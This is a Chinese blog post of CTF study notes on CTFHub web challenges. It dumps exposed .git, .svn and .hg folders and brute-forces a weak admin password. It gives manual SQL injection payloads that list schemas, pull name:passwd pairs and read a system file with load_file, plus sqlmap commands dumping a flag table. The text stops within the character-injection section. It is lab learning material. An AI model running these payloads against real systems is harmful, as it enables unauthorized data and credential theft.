<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>CTFHub笔记-Web章节 - Andreo Y.</title><meta name="author" content="">
<meta name="author-link" content="">
<meta name="description" content="学习CTFHub的一些记录和备忘，用于日后复习查询" /><meta name="keywords" content='CTFHUB, 信息安全, Web, 笔记' /><meta itemprop="name" content="CTFHub笔记-Web章节">
<meta itemprop="description" content="学习CTFHub的一些记录和备忘，用于日后复习查询"><meta itemprop="datePublished" content="2023-01-14T11:29:58+08:00" />
<meta itemprop="dateModified" content="2023-01-14T11:29:58+08:00" />
<meta itemprop="wordCount" content="6772"><meta itemprop="image" content="https://andreoy.cn/logo.png"/>
<meta itemprop="keywords" content="CTFHUB,信息安全,Web,笔记," /><meta property="og:title" content="CTFHub笔记-Web章节" />
<meta property="og:description" content="学习CTFHub的一些记录和备忘，用于日后复习查询" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" /><meta property="og:image" content="https://andreoy.cn/logo.png"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-14T11:29:58+08:00" />
<meta property="article:modified_time" content="2023-01-14T11:29:58+08:00" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://andreoy.cn/logo.png"/>

<meta name="twitter:title" content="CTFHub笔记-Web章节"/>
<meta name="twitter:description" content="学习CTFHub的一些记录和备忘，用于日后复习查询"/>
<meta name="application-name" content="Andreo Y.">
<meta name="apple-mobile-web-app-title" content="Andreo Y."><meta name="theme-color" data-light="#ffffff" data-dark="#252627" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://andreoy.cn/posts/ctfhub%E7%AC%94%E8%AE%B0-web/" /><link rel="prev" href="https://andreoy.cn/posts/%E7%B2%89%E8%89%B2%E7%9A%84%E8%A5%BF%E6%9F%9A%E6%85%95%E6%96%AF%E8%9B%8B%E7%B3%95/" /><link rel="next" href="https://andreoy.cn/posts/%E8%BF%94%E6%A0%A1%E5%AE%A3%E8%AE%B2%E5%A4%A7%E7%BA%B2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><meta name="baidu-site-verification" content="code-NEqykcuT3x" /><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "CTFHub笔记-Web章节",
    "inLanguage": "zh-CN",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/andreoy.cn\/posts\/ctfhub%E7%AC%94%E8%AE%B0-web\/"
    },"genre": "posts","keywords": "CTFHUB, 信息安全, Web, 笔记","wordcount":  6772 ,
    "url": "https:\/\/andreoy.cn\/posts\/ctfhub%E7%AC%94%E8%AE%B0-web\/","datePublished": "2023-01-14T11:29:58+08:00","dateModified": "2023-01-14T11:29:58+08:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Andreo Y."
      },"description": ""
  }
  </script><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3263382266976949"
     crossorigin="anonymous"></script>

  </head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Andreo Y."><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 2x"
    data-sizes="auto"
    alt="Andreo Y."
    title="Andreo Y."/><span class="header-title-text"> Andreo Y.&#39;s Space</span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item text-center">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item text-center">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-stream fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item text-center">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tag fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item text-center">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-user-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item text-center">
              <a
                class="menu-link"
                href="/friends/"
                
                
              ><i class="fa-solid fa-user-friends fa-fw fa-sm" aria-hidden="true"></i> 友情链接</a></li><li class="menu-item delimiter"></li><li class="menu-item language">
            <span role="button" aria-label="选择语言" title="选择语言"><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
            </span>
            <ul class="sub-menu"><li class="menu-item">没有更多翻译</li></ul>
          </li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="Search for everything..." id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li>
      </ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Andreo Y."><img
    class="lazyload logo"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png 2x"
    data-sizes="auto"
    alt="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"
    title="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/6F5d1EWoQrmCjLA.png"/><span class="header-title-text"> Andreo Y.&#39;s Space</span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="Search for everything..." id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-stream fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tag fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-user-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
              class="menu-item text-center"
            ><a
                  class="menu-link"
                  href="/friends/"
                  
                  
                ><i class="fa-solid fa-user-friends fa-fw fa-sm" aria-hidden="true"></i> 友情链接</a></li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li><li class="menu-item language">
            <span role="button" aria-label="选择语言" title="选择语言"><i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i>
            </span>
            <select class="language-select" onchange="location = this.value;"><option disabled>没有更多翻译</option></select>
          </li></ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container" data-page-style="narrow"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content always-active" id="toc-content-auto"></div></aside>

  <aside class="aside-custom">
    
</aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX">
        <span>CTFHub笔记-Web章节</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="https://andreoy.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img
    class="lazyload avatar"
    src="/svg/loading.min.svg"
    data-src="https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d="
    data-srcset="https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d=, https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d= 1.5x, https://gravatar.loli.net/avatar/d8234597e50620ab663b4a6e7e89bf99?s=32&amp;d= 2x"
    data-sizes="auto"
    alt="Andreo Y."
    title="Andreo Y."/>&nbsp;Andreo Y.</a></span>
          <span class="post-category">收录于 <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 信息安全</a></span></div>
      <div class="post-meta-line"><span title=2023-01-14&#32;11:29:58><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-14">2023-01-14</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 6772 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 14 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="CTFHub笔记-Web章节">
              <i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
            </span>&nbsp;</div>
    </div><div class="featured-image"><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png 2x"
    data-sizes="auto"
    alt="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png"
    title="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230115185002636.png"/></div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#信息泄露">信息泄露</a>
      <ul>
        <li><a href="#git泄露">Git泄露</a></li>
        <li><a href="#svn泄露">SVN泄露</a></li>
        <li><a href="#hg泄露">HG泄露</a></li>
      </ul>
    </li>
    <li><a href="#密码口令">密码口令</a>
      <ul>
        <li><a href="#弱口令">弱口令</a></li>
      </ul>
    </li>
    <li><a href="#sql注入">SQL注入</a>
      <ul>
        <li><a href="#整数型注入">整数型注入</a></li>
        <li><a href="#字符型注入">字符型注入</a></li>
        <li><a href="#cookie注入">Cookie注入</a></li>
        <li><a href="#ua注入">UA注入</a></li>
        <li><a href="#refer注入">Refer注入</a></li>
        <li><a href="#过滤空格">过滤空格</a></li>
      </ul>
    </li>
    <li><a href="#文件上传">文件上传</a>
      <ul>
        <li><a href="#无验证">无验证</a></li>
        <li><a href="#前端验证">前端验证</a></li>
        <li><a href="#mime验证">MIME验证</a></li>
        <li><a href="#文件头验证">文件头验证</a></li>
        <li><a href="#00截断">00截断</a></li>
        <li><a href="#双写后缀">双写后缀</a></li>
        <li><a href="#htaccess">.htaccess</a></li>
      </ul>
    </li>
    <li><a href="#rce">RCE</a>
      <ul>
        <li><a href="#eval执行">eval执行</a></li>
        <li><a href="#文件包含">文件包含</a></li>
        <li><a href="#phpinput">php://input</a></li>
        <li><a href="#读取源代码">读取源代码</a></li>
        <li><a href="#远程包含">远程包含</a></li>
        <li><a href="#命令注入">命令注入</a></li>
        <li><a href="#过滤cat">过滤cat</a></li>
        <li><a href="#过滤空格-1">过滤空格</a></li>
        <li><a href="#综合过滤练习">综合过滤练习</a></li>
      </ul>
    </li>
    <li><a href="#ssrf">SSRF</a>
      <ul>
        <li><a href="#内网访问">内网访问</a></li>
        <li><a href="#伪协议读取文件">伪协议读取文件</a></li>
        <li><a href="#端口扫描">端口扫描</a></li>
        <li><a href="#post请求">POST请求</a></li>
        <li><a href="#上传文件">上传文件</a></li>
        <li><a href="#fastcgi协议">FastCGI协议</a></li>
        <li><a href="#redis协议">Redis协议</a></li>
        <li><a href="#url-bypass">URL Bypass</a></li>
        <li><a href="#数字ip-bypass">数字IP Bypass</a></li>
        <li><a href="#302跳转-bypass">302跳转 Bypass</a></li>
        <li><a href="#dns重绑定-bypass">DNS重绑定 Bypass</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div
      class="content"
      id="content"
      
      
    ><div class="details admonition question">
    <div class="details-summary admonition-title">
      <i class="icon fa-solid fa-question-circle fa-fw" aria-hidden="true"></i>为什么没有所有的题目？<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
    </div>
    <div class="details-content">
      <div class="admonition-content">个人学习笔记，仅用于复习和查询，没有必要的题目不会出现在此处</div>
    </div>
  </div>
<hr>
<h2 id="信息泄露">信息泄露</h2>
<h3 id="git泄露">Git泄露</h3>
<h4 id="log">log</h4>
<p>使用GitHack：<code>py -2 .\GitHack.py http://challenge-e24ccdf6b6df7031.sandbox.ctfhub.com:10800/.git/</code>（githack工具只支持python2）获取git目录下的全部源文件</p>
<p>发现网页文件并没有flag，于是查询log：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> .<span class="se">\d</span>ist<span class="se">\c</span>hallenge-e24ccdf6b6df7031.sandbox.ctfhub.com_10800<span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>git log
</span></span></code></pre></div><p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113634717.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113634717.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113634717.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113634717.png 2x"
    data-sizes="auto"
    alt="image-20230114113634717"
    title="image-20230114113634717"/></p>
<p>查询remove和add之间的差异，获取flag：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git diff d056ba117983972dd519442a9ae5c2ee5e68d9d3 ea95548ec8b0ae7a919cd45d8d45d60eb94eb1f1
</span></span></code></pre></div><p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113807032.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113807032.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113807032.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114113807032.png 2x"
    data-sizes="auto"
    alt="image-20230114113807032"
    title="image-20230114113807032"/></p>
<h4 id="stash">stash</h4>
<p>git stash可以用于将当前的工作状态保存到git栈，在需要时恢复。</p>
<p>使用上一题的方法，结果得到<code>where is flag</code>，考虑换个方法。</p>
<p>使用stash list列出所有保存过的工作状态</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git stash list
</span></span></code></pre></div><p>发现只有一个存储的stash，于是直接pop，恢复该状态</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git stash pop
</span></span></code></pre></div><p>恢复了一个txt文件，内含flag。</p>
<h3 id="svn泄露">SVN泄露</h3>
<p>使用dcvs ripper工具，需要perl和一堆依赖包。下载了很久，但是没关系</p>
<p>根据提示，直接下载网页的<code>.svn</code>文件夹即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">perl ./rip-svn.pl -u http://challenge-e6bcf44182efa0b7.sandbox.ctfhub.com:10800/.svn
</span></span></code></pre></div><p>需要注意的是，linux下的.开头的文件夹是不显示的，需要<code>ls -a</code>一下，发现.svn文件夹已经下载，于是进入文件夹，找和flag有关的文件，或者txt文件。这里文件比较少，直接就找到了。</p>
<h3 id="hg泄露">HG泄露</h3>
<p>同样是dvcs ripper，同样是直接下载<code>.hg</code>文件夹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">perl ./rip-hg.pl -u http://challenge-45c4fbd3254e4642.sandbox.ctfhub.com:10800/.hg
</span></span></code></pre></div><p>但是这次文件夹结构比较复杂，考虑用<code>grep</code>查找所有文件的内容。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep <span class="s2">&#34;flag&#34;</span> ./ -nr
</span></span></code></pre></div><p>查找当前文件夹下所有含“flag”的地方，并列出行号（-nr和-r的区别即有无行号）</p>
<p>返回值：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep: ./store/undo: binary file matches
</span></span><span class="line"><span class="cl">grep: ./store/00manifest.i: binary file matches
</span></span><span class="line"><span class="cl">./store/fncache:3:data/flag_325258098.txt.i
</span></span><span class="line"><span class="cl">./last-message.txt:1:add flag
</span></span><span class="line"><span class="cl">grep: ./dirstate: binary file matches
</span></span><span class="line"><span class="cl">grep: ./undo.dirstate: binary file matches
</span></span></code></pre></div><p>发现<code>flag_325258098.txt.i</code>文件类似答案格式，所以直接尝试在浏览器上查看该文件（去掉i）。在浏览器中输入<code>http://challenge-45c4fbd3254e4642.sandbox.ctfhub.com:10800/flag_325258098.txt</code>，即得到答案。</p>
<h2 id="密码口令">密码口令</h2>
<h3 id="弱口令">弱口令</h3>
<p>就是用常用密码列表去尝试。使用BurpSuite的Intruder，常用cluster bomb（兼容性高）</p>
<p>用户名基本上是admin，密码就用某个列表去爆破，直到出现response的区别：可用长度、状态等排序，也可以用查找、过滤</p>
<p>发现出现503错误，故在resource pool中设置速度，减少并发访问。</p>
<p><img
    class="lazyload"
    src="/svg/loading.min.svg"
    data-src="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114191404524.png"
    data-srcset="https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114191404524.png, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114191404524.png 1.5x, https://pigco-1313228125.cos.ap-shanghai.myqcloud.com/img/image-20230114191404524.png 2x"
    data-sizes="auto"
    alt="image-20230114191404524"
    title="image-20230114191404524"/></p>
<h2 id="sql注入">SQL注入</h2>
<div class="details admonition danger open">
    <div class="details-summary admonition-title">
      <i class="icon fa-solid fa-skull-crossbones fa-fw" aria-hidden="true"></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
    </div>
    <div class="details-content">
      <div class="admonition-content">手工注入时，先判断注入类型</div>
    </div>
  </div>
<h3 id="整数型注入">整数型注入</h3>
<h4 id="手工判断能否注入">手工判断能否注入</h4>
<p>输入<code>1 and 1=0</code>，无返回结果；输入<code>1 and 1=1</code>，有输出$\Rightarrow$存在注入</p>
<h4 id="手工判断几个字段">手工判断几个字段</h4>
<p>输入<code>1 order by n</code>，不断调整n的值，使得n有输出，n+1无输出，则SQL语句返回n个字段</p>
<h4 id="手工判断输出位置">手工判断输出位置</h4>
<p><code>0 union select 1,2</code>看1和2分别在哪里输出（0是一个无输出的输入，不一定是0；此处以两个字段为例）</p>
<h4 id="手工查询当前库名称">手工查询当前库名称</h4>
<p><code>0 union select 1,database()</code>那么在前面“2”的位置就会输出当前的数据库名称（database()仅限MySQL）</p>
<h4 id="获取指定字段的内容">获取指定字段的内容</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">()</span><span class="w">    </span><span class="o">//</span><span class="err">当前用户、库、版本</span><span class="p">,</span><span class="err">【</span><span class="k">database</span><span class="p">,</span><span class="k">version</span><span class="err">】</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="w">   </span><span class="o">//</span><span class="err">取库名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;库名&#39;</span><span class="w">    </span><span class="o">//</span><span class="err">取表名</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;库名&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;表名&#39;</span><span class="w">  </span><span class="o">//</span><span class="err">取表字段</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">passwd</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="mi">510</span><span class="n">_admin</span><span class="w"> </span><span class="o">//</span><span class="err">取表内容</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a是冒号</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;c:\\boot.ini&#39;</span><span class="p">)</span><span class="w">  </span><span class="o">//</span><span class="err">读取文件</span><span class="w">
</span></span></span></code></pre></div><h4 id="使用工具注入">使用工具注入</h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sqlmap -u http://challenge-67b3dcdf3cda2199.sandbox.ctfhub.com:10800/?id<span class="o">=</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">$ sqlmap -u http://challenge-67b3dcdf3cda2199.sandbox.ctfhub.com:10800/?id<span class="o">=</span><span class="m">1</span> --current-db
</span></span><span class="line"><span class="cl">current database: <span class="s1">&#39;sqli&#39;</span>
</span></span><span class="line"><span class="cl">$ sqlmap -u http://challenge-67b3dcdf3cda2199.sandbox.ctfhub.com:10800/?id<span class="o">=</span><span class="m">1</span> -D sqli --tables
</span></span><span class="line"><span class="cl">Database: sqli
</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
</span></span><span class="line"><span class="cl">+------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> flag <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> news <span class="p">|</span>
</span></span><span class="line"><span class="cl">+------+
</span></span><span class="line"><span class="cl">$ sqlmap -u http://challenge-67b3dcdf3cda2199.sandbox.ctfhub.com:10800/?id<span class="o">=</span><span class="m">1</span> -D sqli -T flag --columns
</span></span><span class="line"><span class="cl">Database: sqli
</span></span><span class="line"><span class="cl">Table: flag
</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">1</span> column<span class="o">]</span>
</span></span><span class="line"><span class="cl">+--------+--------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Column <span class="p">|</span> Type         <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------+--------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> flag   <span class="p">|</span> varchar<span class="o">(</span>100<span class="o">)</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------+--------------+
</span></span><span class="line"><span class="cl">$ sqlmap -u http://challenge-67b3dcdf3cda2199.sandbox.ctfhub.com:10800/?id<span class="o">=</span><span class="m">1</span> -D sqli -T flag --dump
</span></span><span class="line"><span class="cl">Database: sqli
</span></span><span class="line"><span class="cl">Table: flag
</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">1</span> entry<span class="o">]</span>
</span></span><span class="line"><span class="cl">+----------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> flag                             <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> ctfhub<span class="o">{</span>3bfbd5f6288520f86bd301d3<span class="o">}</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">+----------------------------------+
</span></span></code></pre></div><h3 id="字符型注入">字符型注入</h3>
<p>使用工具方法同整数型</p>
<h4 id="手工判断能否注入-1">手工判断能否注入</h4>
<p>输入<code>1' and '1'='0</code>，无返回结果；输入<code>1' and '1'='1</code>，有输出$\Rightarrow$存在注入</p>
<h4 id="手工判断几个字段-1">手工判断几个字段</h4>
<p>输入<code>1' order by n #</code>，不断调整n的值，使得n有输出，n+1无输出，则SQL语句返回n个字段，其中#后面为注释</p>
<h4 id="手工判断输出位置-1">手工判断输出位置</h4>
<p><code>0' union select 1,2 #</code>看1和2分别在哪里输出（0是一个无输出的输入，不一定是0；此处以两个字段为例）</p>
